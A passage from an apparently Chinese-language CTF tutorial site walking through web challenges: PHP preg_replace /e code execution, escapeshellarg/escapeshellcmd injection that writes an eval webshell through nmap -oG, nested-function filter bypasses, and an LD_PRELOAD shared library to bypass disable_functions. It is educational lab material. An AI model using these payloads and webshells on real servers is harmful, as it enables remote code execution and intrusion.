<a id="__codelineno-126-14" name="__codelineno-126-14" href="#__codelineno-126-14"></a><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$re</span> <span class="o">=&gt;</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-126-15" name="__codelineno-126-15" href="#__codelineno-126-15"></a>    <span class="k">echo</span> <span class="nx">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span><span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<a id="__codelineno-126-16" name="__codelineno-126-16" href="#__codelineno-126-16"></a><span class="p">}</span>
<a id="__codelineno-126-17" name="__codelineno-126-17" href="#__codelineno-126-17"></a>
<a id="__codelineno-126-18" name="__codelineno-126-18" href="#__codelineno-126-18"></a><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
<a id="__codelineno-126-19" name="__codelineno-126-19" href="#__codelineno-126-19"></a>    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
<a id="__codelineno-126-20" name="__codelineno-126-20" href="#__codelineno-126-20"></a><span class="p">}</span>
</code></pre></div>
<p>将所有 GET 参数的“键”当作 <code>$re</code> 正则模式，“值”当作 <code>$str</code> 待处理文本，逐一调用 <code>complex()</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a><span class="x">foreach($_GET as $re =&gt; $str) {</span>
<a id="__codelineno-127-2" name="__codelineno-127-2" href="#__codelineno-127-2"></a><span class="x">    echo complex($re, $str). "\n";</span>
<a id="__codelineno-127-3" name="__codelineno-127-3" href="#__codelineno-127-3"></a><span class="x">}</span>
</code></pre></div>
<p>preg_replace 用于进行正则表达式替换的函数</p>
<p>第一个参数是要匹配的正则表达式模式，第二个参数是用于替换的内容，第三个是要进行替换的输入字符串</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b1728cd0e0a243d4ffc1f4.jpg"></p>
<p>这段代码的作用是：在字符串 <code>$str</code> 中查找匹配正则表达式 <code>($re)</code> 的部分，将匹配到的内容转换为小写形式</p>
<ul>
<li><strong><code>/e</code> 修饰符</strong>：表示将替换字符串作为 PHP 代码执行</li>
<li><strong><code>/i</code> 修饰符</strong>：表示正则匹配不区分大小写</li>
</ul>
<p>因此，<code>strtolower("\\1")</code> 会将第一个捕获组（即匹配的内容）转换为小写</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a><span class="x">preg_replace(</span>
<a id="__codelineno-128-2" name="__codelineno-128-2" href="#__codelineno-128-2"></a><span class="x">    '/(' . $re . ')/ei',</span>
<a id="__codelineno-128-3" name="__codelineno-128-3" href="#__codelineno-128-3"></a><span class="x">    'strtolower("\\1")',</span>
<a id="__codelineno-128-4" name="__codelineno-128-4" href="#__codelineno-128-4"></a><span class="x">    $str</span>
<a id="__codelineno-128-5" name="__codelineno-128-5" href="#__codelineno-128-5"></a><span class="x">);</span>
<a id="__codelineno-128-6" name="__codelineno-128-6" href="#__codelineno-128-6"></a>
<a id="__codelineno-128-7" name="__codelineno-128-7" href="#__codelineno-128-7"></a><span class="x"># $re = 'HELLO'</span>
<a id="__codelineno-128-8" name="__codelineno-128-8" href="#__codelineno-128-8"></a><span class="x"># $str = 'Hello World!'</span>
<a id="__codelineno-128-9" name="__codelineno-128-9" href="#__codelineno-128-9"></a><span class="x"># 输出：hello World!</span>
</code></pre></div>
<p>现在再来看源代码多了个 <code>ei</code>，<code>e</code> 修饰符会导致正则表达式的替换部分 <code>strtolower("\\1")</code> 被当作 PHP 代码执行</p>
<p><code>i</code> 修饰符不区分大小写，相当于 <code>eval('strtolower("\\1");')</code></p>
<p>当 \1 是我们传进去的 <code>{${phpinfo()}}</code> 时，其实就是 <code>eval('strtolower("{${phpinfo()}}");')</code></p>
<p>但是我们为什么要传入 <code>{${phpinfo()}}</code> 呢？</p>
<p><code>${phpinfo()}</code> 中的 <code>phpinfo()</code> 会被当作变量先执行，执行后变成 <code>${1}</code></p>
<p>1 是因为 <code>phpinfo()</code> 成功执行后返回 true，而 <code>strtolower("{${1}}")</code> 又相当于空字符串</p>
<p>所以关键在于 preg_match 的第二个参数是先被当作变量执行了，达到命令执行的效果</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b17340d0e0a243d4ffc20a.jpg"></p>
<p>上面的 <strong>preg_replace</strong> 语句如果直接写在程序里面，当然可以成功执行 <code>phpinfo()</code></p>
<p>通过 GET 传参构造 payload，在 = 号左边传的是匹配模式，右边是要调用的函数或命令</p>
<p>然而传入 <code>.*</code> 却直接报错 </p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b1737ad0e0a243d4ffc20f.jpg"></p>
<p>当非法字符为首字母时，只有点号会被替换成下划线报错，需要绕过这一步</p>
<p><code>\S</code> 匹配所有非空白符不包括换行，加个 <code>*</code> 匹配多个</p>
<p>再跟上 <code>${eval($_POST[cmd])}</code>，再传参 <code>cmd=system("cat /flag");</code></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b173add0e0a243d4ffc219.jpg"></p>
<p>成功拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b173ccd0e0a243d4ffc21d.jpg"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-7.md -->
<h3 id="escapeshellargcmd-rce">escapeshellarg/cmd RCE<a class="headerlink" href="#escapeshellargcmd-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b174add0e0a243d4ffc23a.jpg"></p>
<p>打开网页拿到源码</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b174bcd0e0a243d4ffc23c.jpg"></p>
<p>传入的参数是：172.17.0.2' -v -d a=1</p>
<p>经过 escapeshellarg 处理后变成了 '172.17.0.2 '\'' -v -d a=1'</p>
<p>即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用</p>
<p>经过 escapeshellcmd 处理后变成 '172.17.0.2 '\\'' -v -d a=1\'</p>
<p>这是因为 escapeshellcmd 对  以及最后那个不配对儿的引号进行了转义</p>
<p>最后执行的命令是 curl '172.17.0.2 '\\'' -v -d a=1\'</p>
<p>由于中间的 \ 被解释为  而不再是转义字符，所以后面的 ' 没有被转义，与再后面的 ' 配对儿成了一个空白连接符</p>
<p>即向 172.17.0.2 发起请求，POST 数据为 a=1</p>
<p>所以经过我们构造之后，输入的值被分割成为了三部分</p>
<p>第一部分就是curl的IP，为172.17.0.2\</p>
<p>第二部分就是两个配对的单引号 ' '</p>
<p>第三部分就是命令参数以及对象 -v -d a=1'</p>
<p>nmap 有一个参数 -oG 可以实现将命令和结果写到文件</p>
<p>所以我们可以控制自己的输入写入文件，这里我们可以写入一句话木马链接，也可以直接命令 cat flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a><span class="x">?host=' </span><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"hack"</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x"> -oG hack.php '</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b1753fd0e0a243d4ffc24c.jpg"></p>
<p>记录下它生成的文件夹名</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b17550d0e0a243d4ffc24f.jpg"></p>
<p>打开蚁剑远程连接</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b1755fd0e0a243d4ffc253.jpg"></p>
<p>成功拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b17570d0e0a243d4ffc254.jpg"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-8.md -->
<h3 id="php">PHP 函数嵌套绕过<a class="headerlink" href="#php" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b17838d0e0a243d4ffc336.jpg"></p>
<p>打开网页啥也不是</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b17848d0e0a243d4ffc337.jpg"></p>
<p>扫描后台发现 git 泄露</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b1785bd0e0a243d4ffc339.jpg"></p>
<p>使用 GitHack.py 下载文件</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b17873d0e0a243d4ffc33c.jpg"></p>
<p>拿到源码一顿分析，首先是过滤了伪协议，第二是匹配以字母或下划线开头的函数调用</p>
<p>(?R) 是递归模式，用于匹配嵌套函数调用，最后过滤了一些关键字</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-130-2" name="__codelineno-130-2" href="#__codelineno-130-2"></a><span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span>
<a id="__codelineno-130-3" name="__codelineno-130-3" href="#__codelineno-130-3"></a><span class="k">echo</span> <span class="s2">"flag在哪里呢？&lt;br&gt;"</span><span class="p">;</span>
<a id="__codelineno-130-4" name="__codelineno-130-4" href="#__codelineno-130-4"></a><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'exp'</span><span class="p">])){</span>
<a id="__codelineno-130-5" name="__codelineno-130-5" href="#__codelineno-130-5"></a>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'exp'</span><span class="p">]))</span> <span class="p">{</span>
<a id="__codelineno-130-6" name="__codelineno-130-6" href="#__codelineno-130-6"></a>        <span class="k">if</span><span class="p">(</span><span class="s1">';'</span> <span class="o">===</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[a-z,_]+\((?R)?\)/'</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'exp'</span><span class="p">]))</span> <span class="p">{</span>
<a id="__codelineno-130-7" name="__codelineno-130-7" href="#__codelineno-130-7"></a>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'exp'</span><span class="p">]))</span> <span class="p">{</span>
<a id="__codelineno-130-8" name="__codelineno-130-8" href="#__codelineno-130-8"></a>                <span class="c1">// echo $_GET['exp'];</span>
<a id="__codelineno-130-9" name="__codelineno-130-9" href="#__codelineno-130-9"></a>                <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'exp'</span><span class="p">]);</span>
<a id="__codelineno-130-10" name="__codelineno-130-10" href="#__codelineno-130-10"></a>            <span class="p">}</span>
<a id="__codelineno-130-11" name="__codelineno-130-11" href="#__codelineno-130-11"></a>            <span class="k">else</span><span class="p">{</span>
<a id="__codelineno-130-12" name="__codelineno-130-12" href="#__codelineno-130-12"></a>                <span class="k">die</span><span class="p">(</span><span class="s2">"还差一点哦！"</span><span class="p">);</span>
<a id="__codelineno-130-13" name="__codelineno-130-13" href="#__codelineno-130-13"></a>            <span class="p">}</span>
<a id="__codelineno-130-14" name="__codelineno-130-14" href="#__codelineno-130-14"></a>        <span class="p">}</span>
<a id="__codelineno-130-15" name="__codelineno-130-15" href="#__codelineno-130-15"></a>        <span class="k">else</span><span class="p">{</span>
<a id="__codelineno-130-16" name="__codelineno-130-16" href="#__codelineno-130-16"></a>            <span class="k">die</span><span class="p">(</span><span class="s2">"再好好想想！"</span><span class="p">);</span>
<a id="__codelineno-130-17" name="__codelineno-130-17" href="#__codelineno-130-17"></a>        <span class="p">}</span>
<a id="__codelineno-130-18" name="__codelineno-130-18" href="#__codelineno-130-18"></a>    <span class="p">}</span>
<a id="__codelineno-130-19" name="__codelineno-130-19" href="#__codelineno-130-19"></a>    <span class="k">else</span><span class="p">{</span>
<a id="__codelineno-130-20" name="__codelineno-130-20" href="#__codelineno-130-20"></a>        <span class="k">die</span><span class="p">(</span><span class="s2">"还想读flag，臭弟弟！"</span><span class="p">);</span>
<a id="__codelineno-130-21" name="__codelineno-130-21" href="#__codelineno-130-21"></a>    <span class="p">}</span>
<a id="__codelineno-130-22" name="__codelineno-130-22" href="#__codelineno-130-22"></a><span class="p">}</span>
<a id="__codelineno-130-23" name="__codelineno-130-23" href="#__codelineno-130-23"></a><span class="c1">// highlight_file(__FILE__);</span>
<a id="__codelineno-130-24" name="__codelineno-130-24" href="#__codelineno-130-24"></a><span class="cp">?&gt;</span>
</code></pre></div>
<p>需要了解几个函数</p>
<p>scandir() 返回指定目录中的文件和目录的数组</p>
<p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，相当于 ls</p>
<p>current() 返回数组中当前元素的值（也可以替换为 pos()）</p>
<p>最后 print_r 打印出来发现 flag.php</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>print_r(scandir(current(localeconv())));
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b178f0d0e0a243d4ffc347.jpg"></p>
<p>当然也可以直接</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a><span class="x">var_dump(scandir('.'));</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/683961f558cb8da5c81d3019.png"></p>
<p>接下来先先使用 array_reverse() 反转，再接上 next() 跳到第二个即 flag.php</p>
<p>最后外面套一个高亮显示拿到 flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a><span class="x">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b17919d0e0a243d4ffc34d.jpg"></p>
<p>或者</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a><span class="x">var_dump(file_get_contents('./f1ag.php'));</span>
</code></pre></div>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-9.md -->
<h3 id="ld_preload">LD_PRELOAD 环境变量提权<a class="headerlink" href="#ld_preload" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a0b9d0e0a243d4ffaef3.jpg"></p>
<p>加密混淆，这一步因为解密网站挂了就跳过</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a0c2d0e0a243d4ffaefa.jpg"></p>
<p>网上找的图</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a0eed0e0a243d4ffaf20.jpg"></p>
<p>使用中国蚁剑远程连接</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a0d6d0e0a243d4ffaf05.jpg"></p>
<p>访问别的目录报错，应该设置了 disable_function 函数</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a122d0e0a243d4ffaf47.jpg"></p>
<p>基于黑名单来实现对某些函数使用的限制</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a138d0e0a243d4ffaf5a.jpg"></p>
<p>使用蚁剑的插件绕过，网不行的自己去 GitHub 上下插件</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a152d0e0a243d4ffaf70.jpg"></p>
<p>LD_PRELOAD 是一个可选的 Unix 环境变量，  包含一个或多个共享库或共享库的路径</p>
<p>它允许你定义在程序运行前优先加载的动态链接库，即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令</p>
<p><a href="https://www.freebuf.com/articles/web/280446.html">原文链接</a></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a197d0e0a243d4ffaf9f.jpg"></p>
<p>最后远程连接这个新木马就行了，密码一样的</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a1bed0e0a243d4ffafc4.jpg"></p>
<p>当然也可以手动（以下代码均适用于 CTFHUB 的 LD_PRELOAD 一题）</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="c1">   // 包含 system(), getenv(), unsetenv() 等函数</span>
<a id="__codelineno-135-2" name="__codelineno-135-2" href="#__codelineno-135-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="c1">    // 包含标准输入输出函数，如 printf()</span>
<a id="__codelineno-135-3" name="__codelineno-135-3" href="#__codelineno-135-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="c1">   // 包含字符串处理函数（虽然本程序中未使用）</span>
<a id="__codelineno-135-4" name="__codelineno-135-4" href="#__codelineno-135-4"></a>
<a id="__codelineno-135-5" name="__codelineno-135-5" href="#__codelineno-135-5"></a><span class="c1">// payload 函数：执行系统命令，将 /readflag 的输出重定向到 /tmp/flag 文件中</span>
<a id="__codelineno-135-6" name="__codelineno-135-6" href="#__codelineno-135-6"></a><span class="kt">void</span><span class="w"> </span><span class="nf">payload</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-135-7" name="__codelineno-135-7" href="#__codelineno-135-7"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">"/readflag &gt;/tmp/flag"</span><span class="p">);</span><span class="w">  </span><span class="c1">// 调用 shell 执行命令，读取 flag 并写入临时文件</span>
<a id="__codelineno-135-8" name="__codelineno-135-8" href="#__codelineno-135-8"></a><span class="p">}</span>
<a id="__codelineno-135-9" name="__codelineno-135-9" href="#__codelineno-135-9"></a>
<a id="__codelineno-135-10" name="__codelineno-135-10" href="#__codelineno-135-10"></a><span class="c1">// 重写的 geteuid 函数：通常用于返回有效用户ID，但此处用于恶意操作</span>
<a id="__codelineno-135-11" name="__codelineno-135-11" href="#__codelineno-135-11"></a><span class="kt">int</span><span class="w"> </span><span class="nf">geteuid</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-135-12" name="__codelineno-135-12" href="#__codelineno-135-12"></a><span class="w">    </span><span class="c1">// 检查环境变量 LD_PRELOAD 是否存在</span>
<a id="__codelineno-135-13" name="__codelineno-135-13" href="#__codelineno-135-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-135-14" name="__codelineno-135-14" href="#__codelineno-135-14"></a><span class="w">        </span><span class="c1">// 如果 LD_PRELOAD 没有设置，返回 0，表示没有劫持动态链接库</span>
<a id="__codelineno-135-15" name="__codelineno-135-15" href="#__codelineno-135-15"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a id="__codelineno-135-16" name="__codelineno-135-16" href="#__codelineno-135-16"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-135-17" name="__codelineno-135-17" href="#__codelineno-135-17"></a>
<a id="__codelineno-135-18" name="__codelineno-135-18" href="#__codelineno-135-18"></a><span class="w">    </span><span class="c1">// 如果设置了 LD_PRELOAD，先取消设置，避免后续影响</span>
<a id="__codelineno-135-19" name="__codelineno-135-19" href="#__codelineno-135-19"></a><span class="w">    </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
<a id="__codelineno-135-20" name="__codelineno-135-20" href="#__codelineno-135-20"></a>
<a id="__codelineno-135-21" name="__codelineno-135-21" href="#__codelineno-135-21"></a><span class="w">    </span><span class="c1">// 执行恶意 payload，将敏感信息写入 /tmp/flag</span>
<a id="__codelineno-135-22" name="__codelineno-135-22" href="#__codelineno-135-22"></a><span class="w">    </span><span class="n">payload</span><span class="p">();</span>
<a id="__codelineno-135-23" name="__codelineno-135-23" href="#__codelineno-135-23"></a><span class="p">}</span>
</code></pre></div>
<p>记得先加权限</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a>gcc<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>hack.c<span class="w"> </span>-o<span class="w"> </span>hack.so
</code></pre></div>
<table>
<thead>
<tr>
<th>部分</th>
<th style="text-align: left;">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>gcc</code></td>
<td style="text-align: left;">GNU C 编译器，用于编译 C 程序</td>
</tr>
<tr>
<td><code>-fPIC</code></td>
<td style="text-align: left;">生成位置无关代码（Position-Independent Code）这是构建共享库（<code>.so</code> 文件）所必须的选项，允许生成的代码可以被加载到任意内存地址而不出错</td>
</tr>
<tr>
<td><code>-shared</code></td>
<td style="text-align: left;">指定生成一个共享库（<code>.so</code> 文件），而不是一个可执行文件</td>
</tr>
<tr>
<td><code>hack.c</code></td>
<td style="text-align: left;">要编译的源文件，里面通常包含自定义的函数（如重定义 <code>geteuid()</code>）</td>
</tr>
<tr>
<td><code>-o hack.so</code></td>
<td style="text-align: left;">指定输出文件名为 <code>hack.so</code>（生成的共享对象）</td>
</tr>
</tbody>
</table>
<p>然后上传到 <code>/tmp</code>目录下</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-137-2" name="__codelineno-137-2" href="#__codelineno-137-2"></a><span class="c1">// 设置环境变量 LD_PRELOAD 为 /tmp/hack.so</span>
<a id="__codelineno-137-3" name="__codelineno-137-3" href="#__codelineno-137-3"></a><span class="c1">// 这样在调用某些系统函数时会优先加载 /tmp/hack.so 中的函数实现（如劫持 geteuid）</span>
<a id="__codelineno-137-4" name="__codelineno-137-4" href="#__codelineno-137-4"></a><span class="nb">putenv</span><span class="p">(</span><span class="s2">"LD_PRELOAD=/tmp/hack.so"</span><span class="p">);</span>
<a id="__codelineno-137-5" name="__codelineno-137-5" href="#__codelineno-137-5"></a>
<a id="__codelineno-137-6" name="__codelineno-137-6" href="#__codelineno-137-6"></a><span class="c1">// 触发某些底层 C 函数调用（如 geteuid）的方法之一</span>
<a id="__codelineno-137-7" name="__codelineno-137-7" href="#__codelineno-137-7"></a><span class="c1">// 此处调用 error_log 尽管参数是空的，但有可能触发内部系统调用，从而触发 hack.so 中的恶意函数</span>
<a id="__codelineno-137-8" name="__codelineno-137-8" href="#__codelineno-137-8"></a><span class="nb">error_log</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="s2">""</span><span class="p">);</span>
<a id="__codelineno-137-9" name="__codelineno-137-9" href="#__codelineno-137-9"></a>
<a id="__codelineno-137-10" name="__codelineno-137-10" href="#__codelineno-137-10"></a><span class="c1">// 输出提示信息，说明 PHP 脚本执行完毕</span>
<a id="__codelineno-137-11" name="__codelineno-137-11" href="#__codelineno-137-11"></a><span class="k">echo</span> <span class="s2">"ok"</span><span class="p">;</span>
<a id="__codelineno-137-12" name="__codelineno-137-12" href="#__codelineno-137-12"></a><span class="cp">?&gt;</span>
</code></pre></div>
<p>上传文件</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881866458cb8da5c8d260bb.png"></p>
<p>s<img alt="" src="https://pic1.imgdb.cn/item/6881866e58cb8da5c8d26142.png"></p>
<p>访问文件</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881872c58cb8da5c8d26988.png"></p>
<p>这时候就可以拿到 flag 了 </p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6881874858cb8da5c8d26b39.png"></p></div>

<!-- Source file information -->


<!-- Was this page helpful? -->

  




<!-- Previous and next pages link -->
<nav
class="md-footer__inner md-grid"
aria-label="页脚"

>

<!-- Link to previous page -->

  
  <a
    href="../php_code_audit/"
    class="md-footer__link md-footer__link--prev"
    aria-label="上一页: PHP 代码审计"
    rel="prev"
  >
    <div class="md-footer__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
    </div>
    <div class="md-footer__title">
      <span class="md-footer__direction">
        上一页
      </span>
      <div class="md-ellipsis">
        PHP 代码审计
      </div>
    </div>
  </a>


<!-- Link to next page -->

  
  <a
    href="../file_upload/"
    class="md-footer__link md-footer__link--next"
    aria-label="下一页: 文件上传"
    rel="next"
  >
    <div class="md-footer__title">
      <span class="md-footer__direction">
        下一页
      </span>
      <div class="md-ellipsis">
        文件上传
      </div>
    </div>
    <div class="md-footer__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
    </div>
  </a>

</nav>

<!-- Comment system -->

  <h2 id="__comments">评论</h2>
  <!-- Insert generated snippet here -->
  
  <script src="https://giscus.app/client.js"
  data-repo="ProbiusOfficial/Hello-CTF"
  data-repo-id="R_kgDOJXX6hg"
  data-category="Show and tell"
  data-category-id="DIC_kwDOJXX6hs4CXmuV"
  data-mapping="pathname"
  data-strict="0"
  data-reactions-enabled="1"
  data-emit-metadata="0"
  data-input-position="top"
  data-theme="preferred_color_scheme"
  data-lang="zh-CN"
  crossorigin="anonymous"
  async>
</script>

  <!-- Synchronize Giscus theme with palette -->
  <script>
    var giscus = document.querySelector("script[src*=giscus]")

    /* Set palette on initial load */
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate" ? "dark" : "light"
      giscus.setAttribute("data-theme", theme) 
    }

    /* Register event handlers after documented loaded */
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate" ? "dark" : "light"

          /* Instruct Giscus to change theme */
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script>


<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
<head>
  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
  <script>
    pangu.spacingPage();
  </script>
</head>
                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  回到页面顶部
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2024 探姬
    </div>
  
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://twitter.com/probiusofficial" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/probiusofficial" target="_blank" rel="noopener" title="github.com" class="md-social__link">
